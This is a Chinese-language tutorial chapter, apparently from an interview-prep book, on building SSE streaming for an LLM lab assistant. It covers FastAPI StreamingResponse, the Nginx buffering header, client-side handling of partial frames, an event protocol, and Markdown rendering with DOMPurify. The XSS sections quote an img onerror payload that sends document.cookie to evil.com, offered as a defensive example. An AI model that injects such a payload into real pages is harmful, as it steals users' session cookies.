# 第 31 章 · SSE 流式：打字机效果是怎么实现的

> **这一章要回答的核心问题**：为什么流式不能用普通 HTTP 响应？SSE 协议的帧格式是什么？"半包"是什么、为什么要三重防护？为什么 Nginx 会"吃掉"你的流式？

---

## 31.1 引子：为什么必须流式

先看一个数字对比。用户问"介绍一下量子实验室"，模型生成 800 字：

| 方式 | 用户感知 |
|---|---|
| **非流式** | 空白等待 15-20 秒，然后整段出现 |
| **流式** | 0.5 秒后出现第一个字，然后像打字机一样持续输出 |

**心理学研究**：等待超过 3 秒用户就开始焦虑，超过 10 秒会认为"卡死了"。

而 LLM 的生成速度是**每秒 20-50 个 token**（中文约 20-40 字）。生成 800 字需要 20-40 秒。**非流式在这个速度下完全不可用。**

**流式把"等待"变成了"观看"**——用户的注意力被持续的输出吸引，感知等待时间大幅降低。

这就是为什么所有主流 AI 产品（ChatGPT、Claude、DeepSeek）都用流式。

---

## 31.2 三种流式方案对比

| 方案 | 方向 | 复杂度 | 适用场景 |
|---|---|---|---|
| **SSE（Server-Sent Events）** | 服务端 → 客户端（单向） | **低** ✅ | LLM 流式（本项目） |
| **WebSocket** | 双向 | 中 | 需要双向通信（协同编辑、游戏） |
| **HTTP Chunked** | 服务端 → 客户端 | 低 | 更底层，SSE 建立在它之上 |

**为什么选 SSE？** 因为 LLM 流式是**单向**的（服务端推、客户端收），SSE 天然匹配，而且：

- 基于 HTTP，**不需要额外协议**（WebSocket 要握手升级）
- **自动重连**（浏览器原生支持）
- 前端 API 简单（`EventSource` 或 `fetch` + `getReader`）

**什么时候需要 WebSocket？** 需要客户端主动发消息时（比如语音输入的实时音频流、多人协作）。本项目的"用户确认"是**新的 HTTP 请求**（`/chat/stream/resume`），不需要保持长连接，所以 SSE 够用。

> **面试可以说**："我们选 SSE 而不是 WebSocket，因为 LLM 流式是单向推送，SSE 天然匹配且基于 HTTP（不需要协议升级、浏览器原生支持自动重连）。用户的'确认'操作是发起一个新的 HTTP 请求，不需要在同一个长连接上双向通信，所以 WebSocket 的复杂度是没必要的。"

---

## 31.3 SSE 协议：比你想象的简单

### 31.3.1 帧格式

SSE 的每一帧就是一行文本：

```
data: {"type":"token","content":"你"}

data: {"type":"token","content":"好"}

```

**规则**：
- 每帧以 `data: ` 开头
- **帧之间用两个换行 `\n\n` 分隔**
- 内容里不能包含裸的 `\n\n`（会被当成帧分隔）

### 31.3.2 完整响应

```
HTTP/1.1 200 OK
Content-Type: text/event-stream
Cache-Control: no-cache
Connection: keep-alive
X-Accel-Buffering: no

data: {"type":"status","message":"正在思考…"}

data: {"type":"token","content":"实验室"}

data: {"type":"token","content":"开放时间"}

data: {"type":"done"}

```

### 31.3.3 本项目的实现

`api/ai.py:77-105`：

```python
def _sse_line(payload: dict) -> str:
    """拼一条 SSE 帧：data: {json}\n\n"""
    return f"data: {json.dumps(payload, ensure_ascii=False)}\n\n"


@router.post("/chat/stream")
async def chat_stream(
    data: ChatRequest,
    current_user: User = Depends(get_current_user),
    _: None = Depends(ai_rate_limiter),
    db: Session = Depends(get_db),
):
    thread_id = data.thread_id or _new_thread_id()

    async def event_gen():
        async for event in agent_service.stream_agent(db, current_user, data, thread_id):
            yield _sse_line(event)

    return StreamingResponse(
        event_gen(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no",
        },
    )
```

**三个响应头，每个都有讲究**：

| 头 | 作用 | 不设会怎样 |
|---|---|---|
| `Content-Type: text/event-stream` | 声明是 SSE | 前端 `EventSource` 不认 |
| `Cache-Control: no-cache` | 禁止缓存 | 可能被缓存，拿不到实时流 |
| `X-Accel-Buffering: no` | ★ **禁止 Nginx 缓冲** | **Nginx 会攒够 4KB 才发 → 流式变批量** |

> ⚠️ **坑 1（真实且极其常见）**：**部署到 Nginx 后面时流式失效** —— 字不出来，等几秒后一次性出现一大段。
>
> 原因：Nginx 默认开启 `proxy_buffering`，会攒够一个缓冲区（通常 4KB）才发给客户端。对普通响应这是优化（减少网络包），对流式是灾难。
>
> **解法有三种**：
> 1. `X-Accel-Buffering: no`（本项目）—— 只对这一个响应生效，最简单
> 2. Nginx 配置 `proxy_buffering off;`
> 3. `proxy_buffers` 调小
>
> 本项目用方案 1，因为它**在代码里，不依赖运维配置**。这是一个很实用的经验。

### 31.3.4 为什么用 `fetch` 而不是 `EventSource`

浏览器的原生 SSE API 是 `EventSource`：

```javascript
const es = new EventSource('/api/ai/chat/stream')
es.onmessage = (e) => console.log(JSON.parse(e.data))
```

**但它有个致命限制：只能发 GET 请求，不能带 body，不能自定义 header。**

我们的请求需要：
- POST（带 JSON body：`messages`、`thread_id`）
- `Authorization` header（JWT）

**`EventSource` 都不支持**（不能带 body，header 只能靠 Cookie）。

所以本项目用 `fetch` + `getReader()` 手动解析（`api/ai.js:26-74`）：

```javascript
const res = await fetch(url, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', Accept: 'text/event-stream', Authorization: ... },
  body: JSON.stringify(data)
})
const reader = res.body.getReader()
```

> **面试点**："`EventSource` 只能 GET、不能带 body 和自定义 header，而我们需要 POST 带 JSON body 和 JWT，所以用 `fetch` + `getReader()` 手动解析 SSE 流。代价是要自己处理半包和断包。"

---

## 31.4 半包问题：流式解析的核心难点

### 31.4.1 什么是半包

TCP 是**字节流**，不保证"一次 read 拿到一帧"。

假设服务端发了两帧：

```
data: {"type":"token","content":"你"}\n\n
data: {"type":"token","content":"好"}\n\n
```

客户端第一次 `read()` 可能拿到：

```
data: {"type":"token","content":"你"}\n\ndata: {"type":"to
```

**第二帧被截断了**（"半包"）。如果直接 `JSON.parse`，会报错。

也可能一次拿到三帧半：

```
data: {...}\n\ndata: {...}\n\ndata: {"type":"toke
```

**所以必须有一个"缓冲区"**：把不完整的数据留着，等下一帧补上再解析。

### 31.4.2 本项目的三重防护

`api/ai.js:48-74`：

```javascript
const reader = res.body.getReader()
const decoder = new TextDecoder('utf-8')
let buffer = ''

while (true) {
  const { done, value } = await reader.read()
  if (done) break
  buffer += decoder.decode(value, { stream: true })     // ① 防护一

  const chunks = buffer.split('\n\n')
  buffer = chunks.pop() || ''                          // ② 防护二

  for (const chunk of chunks) {
    const line = chunk
      .split('\n')
      .map((item) => item.trim())
      .find((item) => item.startsWith('data:'))
    if (!line) continue                                 // ③ 防护三
    const raw = line.slice(5).trim()
    if (!raw || raw === '[DONE]') continue              // ③ 防护三
    try {
      onEvent(JSON.parse(raw))
    } catch {
      // 半包或脏数据：跳过，等下一帧。
    }
  }
}
```

**逐个拆解**：

**防护一：`decoder.decode(value, { stream: true })`**

```javascript
buffer += decoder.decode(value, { stream: true })
```

`{ stream: true }` 告诉 `TextDecoder`：**这是流式数据，可能有多字节字符被切断**。

**为什么重要？** 中文是 UTF-8 多字节（一个汉字 3 字节）。如果一次 read 刚好切在某个汉字的第 2 个字节：

```
字节序列: [0xE4, 0xBD]  ← "你" 的前两个字节（需要 3 个：0xE4 0xBD 0xA0）
```

没有 `stream: true`，`decode` 会输出一个替换字符 `�`；**有了它，解码器会记住这两个字节，等下一个 chunk 补上第 3 个字节再输出完整的"你"**。

> ⚠️ **坑 2（真实）**：**中文流式输出乱码**。忘了 `{ stream: true }`，长回复里会随机出现 `�`。这是中文场景特有的坑（英文 ASCII 单字节不会遇到）。

**防护二：`chunks.pop()` 保留尾部**

```javascript
const chunks = buffer.split('\n\n')
buffer = chunks.pop() || ''
```

`split('\n\n')` 把缓冲区切成若干帧。**最后一个元素可能是不完整的**（还没收到 `\n\n`），所以 `pop()` 出来留在 `buffer` 里，等下一次 read 补上。

**这是半包处理的核心**：**只处理完整的帧，不完整的留着**。

**防护三：三重过滤 + try/catch**

```javascript
const line = chunk.split('\n').map(trim).find(i => i.startsWith('data:'))
if (!line) continue                    // 没有 data: 开头 → 跳过
const raw = line.slice(5).trim()
if (!raw || raw === '[DONE]') continue  // 空内容或结束标记 → 跳过
try {
  onEvent(JSON.parse(raw))
} catch {
  // 半包或脏数据：跳过，等下一帧。
}
```

三层过滤：
1. 必须是 `data:` 开头的行（SSE 还可能带 `event:`、`id:`、`retry:` 等字段）
2. 内容非空、不是 `[DONE]`（`[DONE]` 是 OpenAI 的结束标记约定，本项目兼容它）
3. `JSON.parse` 包 try/catch —— **解析失败不抛出，跳过等下一帧**

### 31.4.3 为什么 JSON 里不能有裸的 `\n\n`

本项目用 `json.dumps(payload, ensure_ascii=False)`：

```python
f"data: {json.dumps(payload, ensure_ascii=False)}\n\n"
```

`json.dumps` 会把字符串里的换行**转义成 `\n`（两个字符）**，所以 JSON 字符串里**不会出现真正的换行**。

**这保证了帧分隔 `\n\n` 不会被内容误命中。** ✅

> ⚠️ **反例**：如果你手写 `f"data: {content}\n\n"` 而 `content` 里含换行，就会破坏帧结构。**永远用 JSON 序列化，不要手拼。**

---

## 31.5 事件协议：前后端的约定

本项目定义了一套事件类型（`agent_service.py:440-491`）：

| 事件 | 时机 | 前端处理 |
|---|---|---|
| `status` | 开始 | 显示"正在思考…" |
| `tool_start` | 工具开始执行 | 显示"正在检索知识库…" |
| `tool_end` | 工具执行结束 | 显示结果预览（截断 200 字） |
| `token` | 模型吐出一个字 | 追加到回答里 |
| `approval_required` | 需要人工确认 | **弹确认框** |
| `done` | 正常结束 | 清除状态 |
| `error` | 出错 | 显示错误信息 |

### 31.5.1 为什么用 `type` 字段而不是多种 SSE event

SSE 协议支持 `event:` 字段：

```
event: token
data: {"content":"你"}

event: done
data: {}
```

前端要分别 `addEventListener('token', ...)`、`addEventListener('done', ...)`。

**本项目没用**，而是统一 `type` 字段在 JSON 里：

```json
{"type": "token", "content": "你"}
```

**理由**：

| 维度 | `event:` 字段 | `type` 字段 |
|---|---|---|
| 前端处理 | 要注册多个 listener | **一个 switch 搞定** ✅ |
| 数据结构 | 分散 | 集中 |
| 扩展性 | 加类型要改 listener | 加个 case ✅ |
| 调试 | 看 network 面板要区分 | 一眼看到 type ✅ |

**这是"简单优先"的选择** —— 一个字段比协议特性更好用。

### 31.5.2 `astream_events` 的过滤

`agent_service.py:478-484`：

```python
elif kind == "on_chat_model_stream":
    meta = event.get("metadata") or {}
    if meta.get("langgraph_node") not in (None, "agent"):
        continue
    text = _chunk_text((event.get("data") or {}).get("chunk"))
    if text:
        yield {"type": "token", "content": text}
```

**为什么要过滤 `langgraph_node`？**

因为 `astream_events` 会产生**所有** LLM 调用的事件。本项目只有一个 LLM（agent 节点），但如果将来加了"查询改写"的小模型、`rerank` 的判断模型，它们的输出也会产生 token 事件——**会串进用户的对话里**。

过滤条件 `meta.get("langgraph_node") not in (None, "agent")` 的意思是：**只保留来自 `agent` 节点的 token**（`None` 是某些情况下 metadata 缺失，也放行）。

**这是一个前瞻性的防御**。

### 31.5.3 工具结果的截断

`agent_service.py:432-437`：

```python
def _tool_output_preview(output: Any, limit: int = 200) -> str:
    """把工具结果收成短预览，避免整段 JSON 刷到前端。"""
    if isinstance(output, ToolMessage):
        output = output.content
    text = output if isinstance(output, str) else str(output)
    return text if len(text) <= limit else text[:limit] + "…"
```

**为什么要截断？**

因为检索工具可能返回几千字的文档内容。如果全部推给前端显示"工具执行中"，会：
- 刷屏（用户看到一大段滚动）
- 浪费带宽
- 干扰阅读

截断到 200 字 + 省略号，只给一个"预览"。

> **注意**：这只是**前端展示**的截断，**送给模型的完整内容不受影响**（那是 `ToolMessage`）。这是"展示层"和"数据层"的分离。

### 31.5.4 中文标签映射

`agent_service.py:89-97`：

```python
TOOL_LABELS = {
    "search_lab_docs": "检索实验室知识库",
    "list_open_labs": "查询开放实验室",
    "list_lab_equipments": "查询实验室设备",
    "create_lab_reservation": "提交预约",
    "get_today": "获取今天日期",
}
```

工具名是英文（模型需要），但展示给用户要是中文。这个映射让前端显示"正在检索实验室知识库…"而不是"正在执行 search_lab_docs…"。

**这是一个小的产品细节**，但对体验影响很大。

---

## 31.6 前端渲染：Markdown + XSS 防护

### 31.6.1 问题：模型输出的是 Markdown

模型会输出：

```markdown
根据《实验室管理规定.md》：

1. 开放时间：8:00-22:00
2. **禁止**穿拖鞋

> 注意：节假日另行通知
```

如果直接 `{{ content }}` 渲染，用户看到的是一堆 `**` 和 `#`。

**需要转成 HTML**：

```javascript
import marked from 'marked'
import DOMPurify from 'dompurify'

const html = DOMPurify.sanitize(marked.parse(content))
```

### 31.6.2 ★ XSS 防护：为什么要 DOMPurify

**这是前端安全的关键点，面试必问。**

模型输出的内容**不完全可信**——它可能来自：
- 用户上传的文档（恶意用户上传含脚本的 PDF）
- 检索到的知识库内容
- 模型自己生成的（被 prompt injection 诱导）

如果知识库里有这么一段：

```markdown
<img src=x onerror="fetch('http://evil.com?cookie='+document.cookie)">
```

直接 `v-html="marked.parse(content)"` 会**执行这段脚本** —— 完整的 XSS 攻击。

**DOMPurify 的作用**：清洗 HTML，移除危险的标签和属性：

```javascript
DOMPurify.sanitize('<img src=x onerror="alert(1)">')
// → '<img src="x">'      ← onerror 被移除
```

**顺序很重要**：**先 `marked.parse` 转 HTML，再 `DOMPurify.sanitize` 清洗**。反过来做（先清洗再转）会让 Markdown 里的 `<script>` 绕过清洗。

> **面试金句**："模型输出的内容来自知识库和用户上传的文档，不完全可信。我们用的是 **marked 转 HTML + DOMPurify 清洗**的组合，顺序是先转后洗——反过来做的话 Markdown 里的 `<script>` 会绕过清洗。这是 RAG 应用特有的 XSS 风险，因为内容源不是我们完全控制的。"

### 31.6.3 流式渲染的性能问题

每个 token 到达就重新渲染一次 Markdown —— 如果回答有 800 字，就要渲染 800 次！

**优化**：
- 节流（throttle）：每 50ms 最多渲染一次
- 流式期间渲染纯文本，结束后再渲染 Markdown
- 用 `v-memo` 或虚拟滚动

**本项目没有做特殊优化**（Element Plus + Vue 的响应式足够快，且回答通常不长）。这是一个可以改进的点。

---

## 31.7 最小骨架：完整的 SSE 服务端 + 客户端

服务端（Python，可直接跑）：

```python
"""
minimal_sse_server.py —— SSE 流式服务端
运行：pip install fastapi uvicorn && uvicorn minimal_sse_server:app --port 8000
然后用浏览器打开 minimal_sse_client.html 或用 curl 测试：
  curl -N -X POST http://127.0.0.1:8000/chat/stream -H "Content-Type: application/json" -d '{}'
"""
import asyncio
import json

from fastapi import FastAPI
from fastapi.responses import StreamingResponse

app = FastAPI()


def sse_line(payload: dict) -> str:
    """拼一条 SSE 帧。★ json.dumps 会把换行转义，保证帧结构不被破坏。"""
    return f"data: {json.dumps(payload, ensure_ascii=False)}\n\n"


async def event_gen(text: str):
    """模拟 LLM 逐字输出 + 工具事件。"""
    # ① 状态事件
    yield sse_line({"type": "status", "message": "正在思考…"})
    await asyncio.sleep(0.2)

    # ② 工具事件
    yield sse_line({"type": "tool_start", "name": "search_lab_docs",
                    "label": "检索实验室知识库"})
    await asyncio.sleep(0.3)
    yield sse_line({"type": "tool_end", "name": "search_lab_docs",
                    "label": "检索实验室知识库",
                    "preview": "找到 3 条相关资料：开放时间 8:00-22:00…"})

    # ③ 逐字 token 事件（★ 中文逐字，演示 stream: true 的必要性）
    for ch in text:
        yield sse_line({"type": "token", "content": ch})
        await asyncio.sleep(0.05)

    # ④ 结束
    yield sse_line({"type": "done"})


@app.post("/chat/stream")
async def chat_stream():
    text = "根据《实验室管理规定.md》，实验室开放时间为每日 8:00 至 22:00，节假日另行通知。"
    return StreamingResponse(
        event_gen(text),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no",        # ★ 防 Nginx 缓冲
        },
    )
```

客户端（JavaScript 核心逻辑，与 `api/ai.js` 一致）：

```javascript
/**
 * SSE 流式解析（本项目 api/ai.js 的核心逻辑）
 * 三重防护：stream 解码 / 保留不完整帧 / 脏数据跳过
 */
async function streamRequest(url, data, onEvent) {
  const res = await fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Accept: 'text/event-stream',
      Authorization: `Bearer ${token}`
    },
    body: JSON.stringify(data)
  })

  if (res.status === 401) throw new Error('登录已失效，请重新登录')
  if (!res.ok || !res.body) throw new Error('流式接口请求失败')

  // ★ 防御：后端可能返回 JSON 错误而不是流
  const contentType = res.headers.get('content-type') || ''
  if (!contentType.includes('text/event-stream')) {
    const payload = await res.json().catch(() => null)
    throw new Error(payload?.message || '流式接口返回异常')
  }

  const reader = res.body.getReader()
  const decoder = new TextDecoder('utf-8')
  let buffer = ''

  while (true) {
    const { done, value } = await reader.read()
    if (done) break

    // ① 防护一：stream:true —— 防止多字节中文被切断成乱码
    buffer += decoder.decode(value, { stream: true })

    // ② 防护二：只处理完整帧，最后一段（可能不完整）留着
    const chunks = buffer.split('\n\n')
    buffer = chunks.pop() || ''

    for (const chunk of chunks) {
      // ③ 防护三：找 data: 行；空内容 / [DONE] / 解析失败都跳过
      const line = chunk.split('\n')
        .map(s => s.trim())
        .find(s => s.startsWith('data:'))
      if (!line) continue

      const raw = line.slice(5).trim()
      if (!raw || raw === '[DONE]') continue

      try {
        onEvent(JSON.parse(raw))
      } catch {
        // 半包或脏数据：跳过，等下一帧
      }
    }
  }
}
```

**用 curl 测试你会看到**：

```
data: {"type": "status", "message": "正在思考…"}

data: {"type": "tool_start", "name": "search_lab_docs", ...}

data: {"type": "token", "content": "根"}

data: {"type": "token", "content": "据"}

...
```

**注意 curl 要加 `-N`**（`--no-buffer`），否则 curl 自己也会缓冲。

---

## 31.8 面试问答

### Q1：流式是怎么实现的？为什么用 SSE 而不是 WebSocket？

**答**：服务端用 FastAPI 的 `StreamingResponse` 配合异步生成器，逐帧 yield `data: {json}\n\n`；前端用 `fetch` + `getReader()` 手动解析。

选 SSE 而不是 WebSocket 是因为 **LLM 流式是单向推送**（服务端推、客户端收），SSE 天然匹配，而且基于 HTTP（不需要协议升级）、浏览器原生支持自动重连。用户的"确认"操作是发起一个新的 HTTP 请求（`/chat/stream/resume`），不需要在同一个长连接上双向通信，WebSocket 的复杂度没必要。

**为什么不用原生 `EventSource`？** 因为它只能 GET、不能带 body 和自定义 header，而我们要 POST 带 JSON body 和 JWT。所以用 `fetch` + `getReader()`，代价是要自己处理半包。

### Q2：什么是半包？你们怎么处理的？

**答**：TCP 是字节流，一次 read 不保证拿到完整的一帧——可能拿到半帧，也可能拿到三帧半。直接 `JSON.parse` 会报错。

我们做了三重防护：

**一是 `decoder.decode(value, { stream: true })`** —— 告诉解码器这是流式数据。这对中文尤其重要：一个汉字 3 个字节，如果一次 read 切在第 2 个字节，没有这个参数会输出 `�`，有了它会记住残缺字节等下一帧补全。

**二是 `chunks.pop()`** —— `split('\n\n')` 后的最后一个元素可能不完整，`pop()` 出来留在 buffer 里，只处理完整的帧。

**三是 try/catch + 过滤** —— 没有 `data:` 前缀的跳过、空内容和 `[DONE]` 跳过、`JSON.parse` 失败也跳过等下一帧，不抛出。

### Q3：为什么 JSON 序列化能保证帧结构不被破坏？

**答**：因为 `json.dumps` 会把字符串里的换行转义成 `\n` 两个字符，所以 JSON 字符串里不会出现真正的换行符，帧分隔符 `\n\n` 就不会被内容误命中。

反面例子是手写 `f"data: {content}\n\n"` —— 如果 content 里有换行，就会破坏帧结构。**永远用 JSON 序列化，不要手拼 SSE 帧。**

### Q4：部署到 Nginx 后流式失效，怎么排查？

**答**：这是极其常见的问题，表现是"字不出来，等几秒后一次性出现一大段"。

原因是 **Nginx 默认开启 `proxy_buffering`**，会攒够一个缓冲区（通常 4KB）才发给客户端。对普通响应是优化，对流式是灾难。

三种解法：一是响应头加 `X-Accel-Buffering: no`（我们用的，只对这一个响应生效，不依赖运维配置）；二是 Nginx 配置 `proxy_buffering off;`；三是把 `proxy_buffers` 调小。

我们选第一种，因为它在代码里，不依赖运维。

### Q5：模型输出 Markdown，前端怎么安全渲染？

**答**：**marked 转 HTML + DOMPurify 清洗**，顺序是**先转后洗**。

为什么必须清洗？因为模型输出的内容来自知识库和用户上传的文档，**不完全可信**。如果知识库里有 `<img src=x onerror="fetch('http://evil.com?cookie='+document.cookie)">`，直接 `v-html` 会执行脚本——完整的 XSS。DOMPurify 会移除危险的属性。

顺序很关键：先 `marked.parse` 再 `sanitize`。反过来做（先洗再转）的话，Markdown 里的 `<script>` 会在清洗之后才被转成 HTML 标签，绕过清洗。

这是 RAG 应用特有的 XSS 风险——内容源不是我们完全控制的。

### Q6：流式的错误怎么处理？

**答**：分两层。

**服务端**：`_stream_events` 里包了 try/except，`BusinessException` 用它的 message，其他异常记日志后返回通用的"大模型调用失败"。错误也是一条 SSE 事件（`{"type":"error","message":...}`），**连接正常关闭**，前端能收到并展示。

**客户端**：先检查 HTTP 状态（401 → "登录已失效"）；再检查 `Content-Type`（如果后端返回的是 JSON 错误而不是流，就解析它的 message）——这个防御很重要，因为异常时后端可能返回普通 JSON 响应。

### Q7：流式有什么代价？

**答**：四个。

一是**连接占用** —— 每个流式请求占用一个连接直到结束（长回答可能几十秒），高并发下要看连接数。

二是**无法 Cache** —— 流式响应不能被 CDN 缓存。

三是**错误恢复难** —— 流到一半断了，前面已经输出的内容无法"收回"，用户看到半截回答。

四是**前端渲染压力** —— 每个 token 都触发一次响应式更新，长回答有性能问题（本项目没做节流优化，是可以改进的点）。

---

## 31.9 速记卡

> **SSE = 单向推送的 HTTP 流。核心难点是半包处理。**

**为什么流式**：LLM 生成 20-40 字/秒，非流式等 20 秒不可接受

**SSE vs WebSocket**：单向选 SSE（基于 HTTP、自动重连、无需协议升级）

**帧格式**：`data: {json}\n\n`，**两换行分隔**

**★ 三个响应头**：
```
Content-Type: text/event-stream
Cache-Control: no-cache
X-Accel-Buffering: no      ← ★ 防 Nginx 缓冲（流式失效的头号原因）
```

**★ 三重防护**：
1. `decoder.decode(value, { stream: true })` —— **防中文乱码**
2. `chunks.pop()` 保留不完整帧
3. `data:` 前缀过滤 + 空/`[DONE]` 跳过 + try/catch

**★ JSON 序列化保证帧结构**：换行被转义成 `\n`

**不用 EventSource**：只能 GET、无 body、无自定义 header

**事件协议**：`type` 字段（status/tool_start/tool_end/token/approval_required/done/error）

**过滤非 agent 节点 token**：`meta.get("langgraph_node") not in (None, "agent")` → continue

**工具预览截断 200 字**：只影响展示，不影响送给模型的内容

**★ XSS**：**marked 转 HTML → DOMPurify 清洗**（顺序不能反）

**代码位置**：
- 服务端：`api/ai.py:77-133`
- 事件生成：`agent_service.py:440-491`
- 前端解析：`api/ai.js:22-76`

---

## 31.10 延伸思考

1. **流到一半网络断了，用户看到半截回答。怎么优化体验？**
   提示：① 前端记录已接收的内容，提供"重新生成"按钮（带上已生成的部分作为上下文，让模型接着写）；② 服务端可以把已生成的内容写进 checkpoint（但 LangGraph 的 checkpoint 是按超步存的，token 级别不会存）；③ 用 SSE 的 `id:` 字段 + `Last-Event-ID` 做断点续传（`EventSource` 原生支持，但我们用 fetch 要自己实现）。

2. **如果要给流式加"心跳"（防止代理超时断连），怎么做？**
   提示：每隔 15 秒发一个注释帧（SSE 里以 `:` 开头的行是注释，客户端忽略）：`: ping\n\n`。本项目没做，长思考（比如复杂检索）时可能被代理断开。

3. **多个并发流式请求（用户开多个标签页）会不会有问题？**
   提示：浏览器对同一域名的 HTTP/1.1 并发连接数限制是 6。超过会排队。解法：HTTP/2（多路复用）、或者限制同时只能有一个流式请求。**这是一个真实的体验问题**。

---

**下一章**：第 32 章 · JWT 与 RBAC——前后端双重鉴权，越权漏洞是怎么修的。
